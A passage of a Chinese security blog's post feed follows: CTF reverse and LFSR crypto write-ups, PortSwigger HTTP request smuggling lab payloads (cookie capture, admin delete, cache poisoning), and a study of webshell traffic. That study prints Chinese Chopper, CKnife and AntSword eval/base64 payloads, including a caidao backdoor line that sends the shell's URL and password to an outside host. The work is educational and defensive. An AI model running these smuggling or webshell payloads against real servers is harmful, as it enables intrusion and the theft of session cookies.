( i = a2; i &lt;= a3; a2 = i ) &#123; v5 = i; v6 = a1[i]; if ( a2 &lt; result &amp;&amp; i &lt; result ) &#123; do &#123; if ( v6 &gt; a1[result] ) &#123; if ( i &gt;= result ) break; ++i; a1[v5] = a1[result]; if ( i &gt;= result ) break; while ( a1[i] &lt;= v6 ) &#123; if ( ++i &gt;= result ) goto LABEL_13; &#125; if ( i &gt;= result ) break; v5 = i; a1[result] = a1[i]; &#125; --result; &#125; while ( i &lt; result ); &#125;LABEL_13: a1[result] = v6; sub_4010F0(a1, a2, i - 1); result = a3; ++i; &#125; return result;&#125;int main()&#123; int i; int arr_1[] = &#123;90, 74, 83, 69, 67, 97, 78, 72, 51, 110, 103&#125;; sub_4010F0(arr_1, 0, 10); for(i = 0; i &lt; 11; i++) &#123; printf(&quot;%d &quot;, arr_1[i]); &#125;&#125; 得到的结果为 151 67 69 72 74 78 83 90 97 103 110 后续的代码中有对于用户输入的校验 String == v7 + 34 v19 == v11 4 * v20 - 141 == 3 * v9 v21 / 4 == 2 * (v14 / 9) !strcmp(v4, &quot;ak1w&quot;) !strcmp(v5, &quot;V1Ax&quot;) 即 arr_2[0] == arr_1[0]+34, arr_2[0] == 85 arr_2[1] == arr_1[4], arr_2[1] == 74 arr_2[2] == (3*arr_1[2]+141)/4, arr_2[2] == 87 arr_2[3] == arr_1[7]/9*2*4, arr_2[3] == 80 得出flag前四位为&quot;UJWP&quot; sub_401000(arr_2[5:8]) == &quot;ak1w&quot; sub_401000(arr_2[2:5]) == &quot;V1Ax&quot; 目测是Base64 12345echo -n &quot;ak1w&quot; | base64 -djMpecho -n &quot;V1Ax&quot; | base64 -dWP1 flag{UJWP1jMp} [GXYCTF2019]luck_guy 链接: https://buuoj.cn/challenges#[GXYCTF2019]luck_guy EXE 64 IDA中 get_flag 函数反编译结果如下 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152unsigned __int64 get_flag()&#123; unsigned int v0; // eax char v1; // al signed int i; // [rsp+4h] [rbp-3Ch] signed int j; // [rsp+8h] [rbp-38h] unsigned __int64 s; // [rsp+10h] [rbp-30h] char v6; // [rsp+18h] [rbp-28h] unsigned __int64 v7; // [rsp+38h] [rbp-8h] v7 = __readfsqword(0x28u); v0 = time(0LL); srand(v0); for ( i = 0; i &lt;= 4; ++i ) &#123; switch ( rand() % 200 ) &#123; case 1: puts(&quot;OK, it&#x27;s flag:&quot;); memset(&amp;s, 0, 0x28uLL); strcat((char *)&amp;s, f1); strcat((char *)&amp;s, &amp;f2); printf(&quot;%s&quot;, &amp;s); break; case 2: printf(&quot;Solar not like you&quot;); break; case 3: printf(&quot;Solar want a girlfriend&quot;); break; case 4: v6 = 0; s = 0x7F666F6067756369LL; strcat(&amp;f2, (const char *)&amp;s); break; case 5: for ( j = 0; j &lt;= 7; ++j ) &#123; if ( j % 2 == 1 ) v1 = *(&amp;f2 + j) - 2; else v1 = *(&amp;f2 + j) - 1; *(&amp;f2 + j) = v1; &#125; break; default: puts(&quot;emmm,you can&#x27;t find flag 23333&quot;); break; &#125; &#125; return __readfsqword(0x28u) ^ v7;&#125; f2为空字符串, f1=&quot;GXY&#123;do_not_&quot; 在case 4中对f2进行拼接字符串, 拼接内容为0x7F666F6067756369LL(小端排序) 在case 5中对f2进行处理 在case 1中将f1, f2进行拼接并输出flag 123456789#!/usr/bin/env python3flag = &quot;GXY&#123;do_not_&quot;f2 = [0x7F, 0x66, 0x6F, 0x60, 0x67, 0x75, 0x63, 0x69][::-1]for _ in range(len(f2)): if _ % 2 == 1: flag += chr(f2[_]-2); else: flag += chr(f2[_]-1);print(flag) flag{do_not_hate_me} findit 链接: https://buuoj.cn/challenges#findit Android 修改后缀名为zip, 提取classes.dex 使用dex2jar转为jar包 在jd-gui中反编译得到java代码 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677package com.example.findit;import android.os.Bundle;import android.support.v7.app.ActionBarActivity;import android.text.Editable;import android.view.MenuItem;import android.view.View;import android.view.View.OnClickListener;import android.widget.Button;import android.widget.EditText;import android.widget.TextView;public class MainActivity extends ActionBarActivity&#123; protected void onCreate(Bundle paramBundle) &#123; super.onCreate(paramBundle); setContentView(2130903064); paramBundle = (Button)findViewById(2131034173); EditText localEditText = (EditText)findViewById(2131034174); TextView localTextView = (TextView)findViewById(2131034175); paramBundle.setOnClickListener(new View.OnClickListener(new char[] &#123; 84, 104, 105, 115, 73, 115, 84, 104, 101, 70, 108, 97, 103, 72, 111, 109, 101 &#125;, localEditText, new char[] &#123; 112, 118, 107, 113, 123, 109, 49, 54, 52, 54, 55, 53, 50, 54, 50, 48, 51, 51, 108, 52, 109, 52, 57, 108, 110, 112, 55, 112, 57, 109, 110, 107, 50, 56, 107, 55, 53, 125 &#125;, localTextView) &#123; public void onClick(View paramView) &#123; paramView = new char[17]; char[] arrayOfChar = new char[38]; int i = 0; if (i &gt;= 17) &#123; label12: if (!(String.valueOf(paramView).equals(this.val$edit.getText().toString()))) break label308; i = 0; if (i &gt;= 38) &#123; label42: paramView = String.valueOf(arrayOfChar); this.val$text.setText(paramView); return; &#125; &#125; else &#123; if (((this.val$a[i] &lt; &#x27;I&#x27;) &amp;&amp; (this.val$a[i] &gt;= &#x27;A&#x27;)) || ((this.val$a[i] &lt; &#x27;i&#x27;) &amp;&amp; (this.val$a[i] &gt;= &#x27;a&#x27;))) paramView[i] = (char)(this.val$a[i] + &#x27;\\18&#x27;); while (true) &#123; i += 1; break label12: if (((this.val$a[i] &gt;= &#x27;A&#x27;) &amp;&amp; (this.val$a[i] &lt;= &#x27;Z&#x27;)) || ((this.val$a[i] &gt;= &#x27;a&#x27;) &amp;&amp; (this.val$a[i] &lt;= &#x27;z&#x27;))) paramView[i] = (char)(this.val$a[i] - &#x27;\\b&#x27;); paramView[i] = this.val$a[i]; &#125; &#125; if (((this.val$b[i] &gt;= &#x27;A&#x27;) &amp;&amp; (this.val$b[i] &lt;= &#x27;Z&#x27;)) || ((this.val$b[i] &gt;= &#x27;a&#x27;) &amp;&amp; (this.val$b[i] &lt;= &#x27;z&#x27;))) &#123; arrayOfChar[i] = (char)(this.val$b[i] + &#x27;\\16&#x27;); if (((arrayOfChar[i] &gt; &#x27;Z&#x27;) &amp;&amp; (arrayOfChar[i] &lt; &#x27;a&#x27;)) || (arrayOfChar[i] &gt;= &#x27;z&#x27;)) arrayOfChar[i] = (char)(arrayOfChar[i] - &#x27;\\26&#x27;); &#125; while (true) &#123; i += 1; break label42: arrayOfChar[i] = this.val$b[i]; &#125; label308: this.val$text.setText(&quot;答案错了肿么办。。。不给你又不好意思。。。哎呀好纠结啊~~~&quot;); &#125; &#125;); &#125; public boolean onOptionsItemSelected(MenuItem paramMenuItem) &#123; if (paramMenuItem.getItemId() == 2131034176) return true; return super.onOptionsItemSelected(paramMenuItem); &#125;&#125; 第一个字符串内容为&quot;ThisIsTheFlagHome&quot; 第二个字符串内容为&quot;pvkq{m164675262033l4m49lnp7p9mnk28k75}&quot; 目测是凯撒加密, 爆破即可得到flag flag{c164675262033b4c49bdf7f9cda28a75} 简单注册器 链接: https://buuoj.cn/challenges#简单注册器 Android 123456789101112131415161718192021222324252627282930public void onClick(View paramView)&#123; int j = 1; paramView = this.val$editview.getText().toString(); if ((paramView.length() != 32) || (paramView.charAt(31) != &#x27;a&#x27;) || (paramView.charAt(1) != &#x27;b&#x27;) || (paramView.charAt(0) + paramView.charAt(2) - 48 != 56)) j = 0; if (j == 1) &#123; paramView = &quot;dd2940c04462b4dd7c450528835cca15&quot;.toCharArray(); paramView[2] = (char)(paramView[2] + paramView[3] - 50); paramView[4] = (char)(paramView[2] + paramView[5] - 48); paramView[30] = (char)(paramView[31] + paramView[9] - 48); paramView[14] = (char)(paramView[27] + paramView[28] - 97); j = 0; while (true) &#123; if (j &gt;= 16) &#123; paramView = String.valueOf(paramView); this.val$textview.setText(&quot;flag&#123;&quot; + paramView + &quot;&#125;&quot;); return; &#125; int i = paramView[(31 - j)]; paramView[(31 - j)] = paramView[j]; paramView[j] = i; j += 1; &#125; &#125; this.val$textview.setText(&quot;输入注册码错误&quot;);&#125; 1234567891011121314151617#!/usr/bin/env python3cipher = []for _ in &quot;dd2940c04462b4dd7c450528835cca15&quot;: cipher.append(_)cipher[2] = chr(ord(cipher[2])+ord(cipher[3])-50)cipher[4] = chr(ord(cipher[2])+ord(cipher[5])-48)cipher[30] = chr(ord(cipher[31])+ord(cipher[9])-48)cipher[14] = chr(ord(cipher[27])+ord(cipher[28])-97)for j in range(16): i = cipher[(31-j)] cipher[(31-j)] = cipher[j] cipher[j] = iflag = &quot;flag&#123;&quot;for _ in cipher: flag += _flag += &quot;&#125;&quot;print(flag) flag{59acc538825054c7de4b26440c0999dd} [GWCTF 2019]pyre 链接: https://buuoj.cn/challenges#[GWCTF 2019]pyre Python 使用uncompyle6反编译pyc文件得到源代码 123456789101112print &#x27;Welcome to Re World!&#x27;print &#x27;Your input1 is your flag~&#x27;l = len(input1)for i in range(l): num = ((input1[i] + i) % 128 + 128) % 128 code += numfor i in range(l - 1): code[i] = code[i] ^ code[(i + 1)]print codecode = [&#x27;\\x1f&#x27;, &#x27;\\x12&#x27;, &#x27;\\x1d&#x27;, &#x27;(&#x27;, &#x27;0&#x27;, &#x27;4&#x27;, &#x27;\\x01&#x27;, &#x27;\\x06&#x27;, &#x27;\\x14&#x27;, &#x27;4&#x27;, &#x27;,&#x27;, &#x27;\\x1b&#x27;, &#x27;U&#x27;, &#x27;?&#x27;, &#x27;o&#x27;, &#x27;6&#x27;, &#x27;*&#x27;, &#x27;:&#x27;, &#x27;\\x01&#x27;, &#x27;D&#x27;, &#x27;;&#x27;, &#x27;%&#x27;, &#x27;\\x13&#x27;] 12345678910111213#!/usr/bin/env python3cipher = [&#x27;\\x1f&#x27;, &#x27;\\x12&#x27;, &#x27;\\x1d&#x27;, &#x27;(&#x27;, &#x27;0&#x27;, &#x27;4&#x27;, &#x27;\\x01&#x27;, &#x27;\\x06&#x27;, &#x27;\\x14&#x27;, &#x27;4&#x27;, &#x27;,&#x27;, &#x27;\\x1b&#x27;, &#x27;U&#x27;, &#x27;?&#x27;, &#x27;o&#x27;, &#x27;6&#x27;, &#x27;*&#x27;, &#x27;:&#x27;, &#x27;\\x01&#x27;, &#x27;D&#x27;, &#x27;;&#x27;, &#x27;%&#x27;, &#x27;\\x13&#x27;]l = len(cipher)for _ in range(l): cipher[_] = ord(cipher[_])for _ in range(l-2, -1, -1): cipher[_] = cipher[_]^cipher[_+1]for _ in range(l): cipher[_] = (cipher[_]-_)%128flag = &quot;&quot;for _ in cipher: flag += chr(_)print(flag) flag{Just_Re_1s_Ha66y!} EOF","categories":[{"name":"Study","slug":"Study","permalink":"https://yoloyolo.top/categories/Study/"}],"tags":[{"name":"Reverse","slug":"Reverse","permalink":"https://yoloyolo.top/tags/Reverse/"}]},{"title":"Crypto-LFSR","slug":"Crypto-LFSR","date":"2021-04-02T05:17:09.000Z","updated":"2021-04-02T15:06:07.000Z","comments":true,"path":"2021/04/02/Crypto-LFSR/","link":"","permalink":"https://yoloyolo.top/2021/04/02/Crypto-LFSR/","excerpt":"Stream Cipher LFSR","text":"Stream Cipher LFSR [2018强网杯]Streamgame1 12345678910111213141516171819202122232425262728from flag import flagassert flag.startswith(&quot;flag&#123;&quot;)assert flag.endswith(&quot;&#125;&quot;)assert len(flag)==25def lfsr(R,mask): output = (R &lt;&lt; 1) &amp; 0xffffff i=(R&amp;mask)&amp;0xffffff lastbit=0 while i!=0: lastbit^=(i&amp;1) i=i&gt;&gt;1 output^=lastbit return (output,lastbit)R=int(flag[5:-1],2)mask = 0b1010011000100011100f=open(&quot;key&quot;,&quot;ab&quot;)for i in range(12): tmp=0 for j in range(8): (R,out)=lfsr(R,mask) tmp=(tmp &lt;&lt; 1)^out f.write(chr(tmp))f.close() 1234hexdump -C key 00000000 55 38 f7 42 c1 0d b2 c7 ed e0 24 3a |U8.B......$:|0000000c 加密流程 序列左移一位 与反馈系数进行且运算 运算结果进行异或得到结果 结果作为序列的结尾 result=cn&amp;an⊕...⊕c2&amp;a2⊕c1&amp;a1result = c_n\\&amp;a_n \\oplus ... \\oplus c_2\\&amp;a_2 \\oplus c_1\\&amp;a_1result=cn​&amp;an​⊕...⊕c2​&amp;a2​⊕c1​&amp;a1​ 反馈系数为 mask = 0b1010011000100011100 即 c19,c17,c14,c13,c9,c5,c4,c3=1c_{19}, c_{17}, c_{14}, c_{13}, c_9, c_5, c_4, c_3 = 1c19​,c17​,c14​,c13​,c9​,c5​,c4​,c3​=1 (从右到左) 那么反馈运算为 result=a19⊕a17⊕a14⊕a13⊕a9⊕a5⊕a4⊕a3result = a_{19} \\oplus a_{17} \\oplus a_{14} \\oplus a_{13} \\oplus a_9 \\oplus a_5 \\oplus a_4 \\oplus a_3result=a19​⊕a17​⊕a14​⊕a13​⊕a9​⊕a5​⊕a4​⊕a3​ 而且我们已知a1-a18以及产生的result 那么就可以根据这些条件来得出a19 a19=result⊕a17⊕a14⊕a13⊕a9⊕a5⊕a4⊕a3a_{19} = result \\oplus a_{17} \\oplus a_{14} \\oplus a_{13} \\oplus a_9 \\oplus a_5 \\oplus a_4 \\oplus a_3a19​=result⊕a17​⊕a14​⊕a13​⊕a9​⊕a5​⊕a4​⊕a3​ 以此类推，来恢复flag 123456789101112131415161718f = open(&quot;key&quot;, &quot;rb&quot;)bytes = f.read(3)f.close()key = &quot;&quot;for i in bytes: if len(bin(i)[2:]) != 8: key += (8 - len(bin(i)[2:])) * &quot;0&quot; + bin(i)[2:] else: key += bin(i)[2:]key = key[:19]print(key)flag = &quot;&quot;for i in range(19): res = key[-1] key = key[:18] awns = chr(int(res) ^ int(key[-3]) ^ int(key[-4]) ^ int(key[-5]) ^ int(key[-9]) ^ int(key[-13]) ^ int(key[-14]) ^ int(key[-17]) + 48) key = awns + keyprint(&quot;flag&#123;&quot; + key + &quot;&#125;&quot;) [2018强网杯]Streamgame2 12345678910111213141516171819202122232425262728from flag import flagassert flag.startswith(&quot;flag&#123;&quot;)assert flag.endswith(&quot;&#125;&quot;)assert len(flag)==27def lfsr(R,mask): output = (R &lt;&lt; 1) &amp; 0xffffff i=(R&amp;mask)&amp;0xffffff lastbit=0 while i!=0: lastbit^=(i&amp;1) i=i&gt;&gt;1 output^=lastbit return (output,lastbit)R=int(flag[5:-1],2)mask=0x100002f=open(&quot;key&quot;,&quot;ab&quot;)for i in range(12): tmp=0 for j in range(8): (R,out)=lfsr(R,mask) tmp=(tmp &lt;&lt; 1)^out f.write(chr(tmp))f.close() 跟上一题一个思路，而且更简单（移位寄存器更少） 1234567891011121314151617181920#!/usr/bin/env python3#coding:utf-8f = open(&quot;key&quot;, &quot;rb&quot;)bytes = f.read(3)f.close()key = &quot;&quot;for i in bytes: if len(bin(i)[2:]) != 8: key += (8 - len(bin(i)[2:])) * &quot;0&quot; + bin(i)[2:] else: key += bin(i)[2:]key = key[:21]flag = &quot;&quot;for i in range(21): res = key[-1] key = key[:20] awns = chr(int(res) ^ int(key[-2]) + 48) key = awns + keyprint(&quot;flag&#123;&quot; + key + &quot;&#125;&quot;) [CISCN2018]oldstreamgame 突然发现都是一个套路 1234567891011121314151617181920212223242526flag = &quot;flag&#123;xxxxxxxxxxxxxxxx&#125;&quot;assert flag.startswith(&quot;flag&#123;&quot;)assert flag.endswith(&quot;&#125;&quot;)assert len(flag)==14def lfsr(R,mask): output = (R &lt;&lt; 1) &amp; 0xffffffff i=(R&amp;mask)&amp;0xffffffff lastbit=0 while i!=0: lastbit^=(i&amp;1) i=i&gt;&gt;1 output^=lastbit return (output,lastbit)R=int(flag[5:-1],16)mask = 0b10100100000010000000100010010100f=open(&quot;key&quot;,&quot;w&quot;)for i in range(100): tmp=0 for j in range(8): (R,out)=lfsr(R,mask) tmp=(tmp &lt;&lt; 1)^out f.write(chr(tmp))f.close() 12345678910111213141516171819#!/usr/bin/env python3#coding:utf-8f = open(&quot;key&quot;, &quot;rb&quot;)bytes = f.read(4)f.close()key = &quot;&quot;for i in bytes: if len(bin(i)[2:]) != 8: key += (8 - len(bin(i)[2:])) * &quot;0&quot; + bin(i)[2:] else: key += bin(i)[2:]print(key)for i in range(32): res = key[-1] key = key[:31] awns = chr(int(res) ^ int(key[-30]) ^ int(key[-27]) ^ int(key[-20]) ^ int(key[-12]) ^ int(key[-8]) ^ int(key[-5]) ^ int(key[-3]) + 48) key = awns + keyprint(&quot;flag&#123;&quot; + hex(int(key,2)) + &quot;&#125;&quot;) TBC","categories":[{"name":"Study","slug":"Study","permalink":"https://yoloyolo.top/categories/Study/"}],"tags":[{"name":"Crypto","slug":"Crypto","permalink":"https://yoloyolo.top/tags/Crypto/"},{"name":"LFSR","slug":"LFSR","permalink":"https://yoloyolo.top/tags/LFSR/"}]},{"title":"HTTP Smuggling","slug":"HTTP-Smuggling","date":"2021-03-19T23:59:31.000Z","updated":"2021-03-26T06:09:44.000Z","comments":true,"path":"2021/03/19/HTTP-Smuggling/","link":"","permalink":"https://yoloyolo.top/2021/03/19/HTTP-Smuggling/","excerpt":"前后端服务器对于HTTP请求处理的差异造成的HTTP走私","text":"前后端服务器对于HTTP请求处理的差异造成的HTTP走私 Basic For HTTP Smuggling CL-TE https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te 前端服务器优先处理Content-Length 后端服务器优先处理Transfer-Encoding 12345678910POST / HTTP/1.1Host: lab_id.web-security-academy.netConnection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 6Transfer-Encoding: chunked0G 前端服务器优先处理Content-Length: 6，内容为&quot;0\\r\\n\\r\\nG&quot; 后端服务器优先处理Transfer-Encoding: chunked，认为收到了一个大小为0的数据块，从而忽视了最后的G 这个G则留在缓冲区内，当下一次HTTP请求发出时，会加在HTTP请求之前 如果将这个数据包重新发一次，就能得到GPOST / HTTP/1.1 TE-CL https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl 前端服务器优先处理Content-Length 后端服务器优先处理Transfer-Encoding 12345678910111213141516POST / HTTP/1.1Host: lab_id.web-security-academy.netConnection: closeTransfer-Encoding: chunkedContent-Length: 4Content-Type: application/x-www-form-urlencoded97GPOST / HTTP/1.1Host: lab_id.web-security-academy.netContent-Length: 5Content-Type: application/x-www-form-urlencoded0 前端服务器优先处理Transfer-Encoding: chunked，认为收到了两个数据块，第一个数据块大小为0x97，第二个数据块大小为0x00（即标识后续无数据） 后端服务器优先处理Content-Length: 6，认为收到了两个HTTP请求，第一个请求内容为97，第二个请求内容为0\\r\\n\\r\\n 而第二个请求在解析时，请求方式为GPOST，即完成了HTTP Smuggling TE-TE https://portswigger.net/web-security/request-smuggling/lab-obfuscating-te-header 前端服务器优先处理一个Transfer-Encoding 后端服务器优先处理另一个Transfer-Encoding 1234567891011121314151617POST / HTTP/1.1Host: lab_id.web-security-academy.netConnection: closeContent-Length: 4Content-Type: application/x-www-form-urlencodedTransfer-Encoding: chunkedTransfer-Encoding: xXxYOLOxXx97GPOST / HTTP/1.1Host: lab_id.web-security-academy.netContent-Length: 5Content-Type: application/x-www-form-urlencoded0 前端服务器优先处理第一个TE，Transfer-Encoding: chunked，认为收到了两个数据块，第一个数据块大小为0x97，第二个数据块大小为0x00（即标识后续无数据） 后端服务器优先处理第二个TE，Transfer-Encoding: xXxYOLOxXx，无法识别，则根据CL来识别HTTP请求报文 12345678910POST / HTTP/1.1Host: lab_id.web-security-academy.netConnection: closeContent-Length: 4Content-Type: application/x-www-form-urlencodedTransfer-Encoding: chunkedTransfer-Encoding: xXxYOLOxXx97 12345678GPOST / HTTP/1.1Host: lab_id.web-security-academy.netContent-Length: 5Content-Type: application/x-www-form-urlencoded0 则第二个请求在被解析时，请求方式为GPOST，即完成了HTTP Smuggling POC For HTTP Smuggling 响应404即可验证HTTP走私漏洞存在 CL-TE https://portswigger.net/web-security/request-smuggling/finding/lab-confirming-cl-te-via-differential-responses 1234567891011POST / HTTP/1.1Host: lab_id.web-security-academy.netConnection: closeContent-Length: 30Content-Type: application/x-www-form-urlencodedTransfer-Encoding: chunked0POST /404 HTTP/1.1Foo: TE-CL https://portswigger.net/web-security/request-smuggling/finding/lab-confirming-te-cl-via-differential-responses 12345678910111213POST / HTTP/1.1Host: lab_id.web-security-academy.netConnection: closeContent-Length: 4Content-Type: application/x-www-form-urlencodedTransfer-Encoding: chunked14POST /404 HTTP/1.10 Exploit For HTTP Smuggling Reveal Front-End Request Rewriting https://portswigger.net/web-security/request-smuggling/exploiting/lab-reveal-front-end-request-rewriting 前端通过一个特殊的未知HTTP头部来给后端传递客户端的IP地址 而后端仅允许admin或本地访问/admin，则需要获取前端所发送的HTTP请求 1234567891011121314POST / HTTP/1.1Host: id_lab.web-security-academy.netConnection: closeContent-Length: 155Content-Type: application/x-www-form-urlencodedTransfer-Encoding: chunked0POST / HTTP/1.1Content-Type: application/x-www-form-urlencodedContent-Length: 300search=test CL-TE漏洞环境，通过search参数值的回显可以将前端所发送的HTTP请求显示出来 1234567891011120 search results for &#39;testContent-Type: application&#x2F;x-www-form-urlencodedPOST &#x2F; HTTP&#x2F;1.1X-pSjyEZ-Ip: XXX.XX.X.XXXHost: id_lab.web-security-academy.netContent-Length: 155Content-Type: application&#x2F;x-www-form-urlencodedTransfer-Encoding: chunked0POST &#x2F; HTTP&#x2F;1.1Content-&#39; 则得到了所需的HTTP头 在进行一次HTTP走私来访问/admin 1234567891011121314POST / HTTP/1.1Host: id_lab.web-security-academy.netConnection: closeContent-Length: 82Content-Type: application/x-www-form-urlencodedTransfer-Encoding: chunked0GET /admin/delete?username=carlos HTTP/1.1X-pSjyEZ-Ip: 127.0.0.1Foo: Capture Other Users’ Requests https://portswigger.net/web-security/request-smuggling/exploiting/lab-capture-other-users-requests 可以借助留言板功能进行HTTP走私，将其他用户的HTTP请求附加与content参数之后 从而在留言板中得到其他用户的Cookie 123456789101112131415POST /404 HTTP/1.1Host: lab_id.web-security-academy.netConnection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 255Transfer-Encoding: chunked0POST /post/comment HTTP/1.1Content-Type: application/x-www-form-urlencodedContent-Length: 734Cookie: session=f8dQDONY1p4VwPnH76xODdySj5jZGrKScsrf=r7He01UCO2us28da01WI0w4rnpqlRV9b&amp;postId=3&amp;name=a&amp;email=a@a.a&amp;website=http%3a%2f%2fa.a&amp;comment= 1234567891011121314GET / HTTP/1.1Host: lab_id.web-security-academy.netConnection: keep-aliveCache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Chrome/227864Accept: text/html,application/xhtml xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Sec-Fetch-Site: noneSec-Fetch-Mode: navigateSec-Fetch-User: ?1Sec-Fetch-Dest: documentAccept-Encoding: gzip, deflate, brAccept-Language: en-USCookie: victim-fingerprint=40HHLq56Pi4ugFHmfdEqHXxe0c7yA09V; secret=HmzO1WU86wcpZ0NDNfCDisKJTQBarFWp; session=DMRf2fxBwIJh8CzkJGAfwnUjdIFxq5G7 Web Cache Poisoning https://portswigger.net/web-security/request-smuggling/exploiting/lab-perform-web-cache-poisoning 需要对目标服务器进行缓存投毒 给出了一台exp服务器，用于存放恶意js文件 1234567891011121314POST /resources/js/tracking.js HTTP/1.1Host: lab_id.web-security-academy.netContent-Length: 177Transfer-Encoding: chunkedContent-Type: application/x-www-form-urlencoded0GET /post/next?postId=7 HTTP/1.1Host: exp_id.web-security-academy.netContent-Length: 3Content-Type: application/x-www-form-urlencoded1=1 这里需要使用站点中的302跳转来进行投毒，跳转过程有些难以理解，个人理解如下 HTTP走私的URL /post/next?postId=2 会请求lab服务器而不是exp服务器，从而触发跳转 触发跳转的过程中，服务器读取Host头，得到exp服务器的主机名 将exp的主机名与跳转目标的路径进行拼接，得到了跳转目标的URL 跳转至恶意JS文件 参考链接: https://blog.csdn.net/lblblblblzdx/article/details/80386693 https://paper.seebug.org/1048/ https://xz.aliyun.com/t/6878","categories":[{"name":"Study","slug":"Study","permalink":"https://yoloyolo.top/categories/Study/"}],"tags":[{"name":"HTTP","slug":"HTTP","permalink":"https://yoloyolo.top/tags/HTTP/"}]},{"title":"Shell_Pcap","slug":"Shell-Pcap","date":"2021-03-12T02:36:09.000Z","updated":"2021-03-17T15:58:55.000Z","comments":true,"path":"2021/03/11/Shell-Pcap/","link":"","permalink":"https://yoloyolo.top/2021/03/11/Shell-Pcap/","excerpt":"看到一堆面试题都有涉及到后门客户端的流量特征，这里自己作一些记录","text":"看到一堆面试题都有涉及到后门客户端的流量特征，这里自己作一些记录 菜刀 菜刀流量默认使用Base64编码 特征非常明显 123pass=@eval%01(base64_decode($_POST[z0]));z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0+fCIpOzskRj1iYXNlNjRfZGVjb2RlKCRfUE9TVFsiejEiXSk7JFA9QGZvcGVuKCRGLCJyIik7ZWNobyhAZnJlYWQoJFAsZmlsZXNpemUoJEYpKSk7QGZjbG9zZSgkUCk7aWYoQCRfQ09PS0lFWydmMSddIT05NSl7QHNldGNvb2tpZSgnZjEnLDk1KTtAZmlsZV9nZXRfY29udGVudHMoJ2h0dHA6Ly96eGV4cC5jb20vZS8/Y2FpZGFvPScuJF9TRVJWRVJbSFRUUF9IT1NUXS4kX1NFUlZFUltSRVFVRVNUX1VSSV0uJ19QPScua2V5KCRfUE9TVCkpO307ZWNobygifDwtIik7ZGllKCk7z1=RTpcXHBocFN0dWR5XFxQSFBUdXRvcmlhbFxcV1dXXFwxLnBocA== 解码之后的内容 12@ini_set(&quot;display_errors&quot;,&quot;0&quot;);@set_time_limit(0);@set_magic_quotes_runtime(0);echo(&quot;-&gt;|&quot;);;$F=base64_decode($_POST[&quot;z1&quot;]);$P=@fopen($F,&quot;r&quot;);echo(@fread($P,filesize($F)));@fclose($P);if(@$_COOKIE[&#x27;f1&#x27;]!=95)&#123;@setcookie(&#x27;f1&#x27;,95);@file_get_contents(&#x27;http://zxexp.com/e/?caidao=&#x27;.$_SERVER[HTTP_HOST].$_SERVER[REQUEST_URI].&#x27;_P=&#x27;.key($_POST));&#125;;echo(&quot;|&lt;-&quot;);die();E:\\\\phpStudy\\\\PHPTutorial\\\\WWW\\\\1.php 值得一提的是，@set_magic_quotes_runtime(0); 这条命令在php7中无法运行 12php &gt; set_magic_quotes_runtime(0);PHP Warning: Uncaught Error: Call to undefined function set_magic_quotes_runtime() in php shell code:1 这直接导致了菜刀无法在php7的环境下使用 参数特征 POST: z0 z1 z2 … 流量特征 QGluaV9zZXQoImRpc3BsYXlfZXJyb3Jz… @eval%01(base64_decode($_POST[z0])); CKnife CKnife使用Base64编码，同样不适用于php7环境，原因与菜刀相同 123pass&#x3D;@eval%01(base64_decode($_POST[action]));action&#x3D;QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0+fCIpOzskRj1iYXNlNjRfZGVjb2RlKCRfUE9TVFsiejEiXSk7JFA9QGZvcGVuKCRGLCJyIik7ZWNobyhAZnJlYWQoJFAsZmlsZXNpemUoJEYpKSk7QGZjbG9zZSgkUCk7O2VjaG8oInw8LSIpO2RpZSgpOw&#x3D;&#x3D;z1&#x3D;RTpccGhwU3R1ZHlcUEhQVHV0b3JpYWxcV1dXXGluZGV4LnR4dA&#x3D;&#x3D; 解码之后的内容 12@ini_set(&quot;display_errors&quot;,&quot;0&quot;);@set_time_limit(0);@set_magic_quotes_runtime(0);echo(&quot;-&gt;|&quot;);;$F&#x3D;base64_decode($_POST[&quot;z1&quot;]);$P&#x3D;@fopen($F,&quot;r&quot;);echo(@fread($P,filesize($F)));@fclose($P);;echo(&quot;|&lt;-&quot;);die();E:\\phpStudy\\PHPTutorial\\WWW\\index.txt 参数特征 POST: z0 z1 z2 … 流量特征 QGluaV9zZXQoImRpc3BsYXlfZXJyb3Jz… @eval%01(base64_decode($_POST[action])); 蚁剑 default 1pass=@ini_set(&quot;display_errors&quot;, &quot;0&quot;);@set_time_limit(0);function asenc($out)&#123;return $out;&#125;;function asoutput()&#123;$output=ob_get_contents();ob_end_clean();echo &quot;7a5cd&quot;;echo @asenc($output);echo &quot;7a6ba&quot;;&#125;ob_start();try&#123;$D=base64_decode($_POST[&quot;0x89edb44048ea7&quot;]);$F=@opendir($D);if($F==NULL)&#123;echo(&quot;ERROR:// Path Not Found Or No Permission!&quot;);&#125;else&#123;$M=NULL;$L=NULL;while($N=@readdir($F))&#123;$P=$D.$N;$T=@date(&quot;Y-m-d H:i:s&quot;,@filemtime($P));@$E=substr(base_convert(@fileperms($P),10,8),-4);$R=&quot; &quot;.$T.&quot; &quot;.@filesize($P).&quot; &quot;.$E.&quot;&quot;;if(@is_dir($P))$M.=$N.&quot;/&quot;.$R;else $L.=$N.$R;&#125;echo $M.$L;@closedir($F);&#125;;&#125;catch(Exception $e)&#123;echo &quot;ERROR://&quot;.$e-&gt;getMessage();&#125;;asoutput();die(); base64 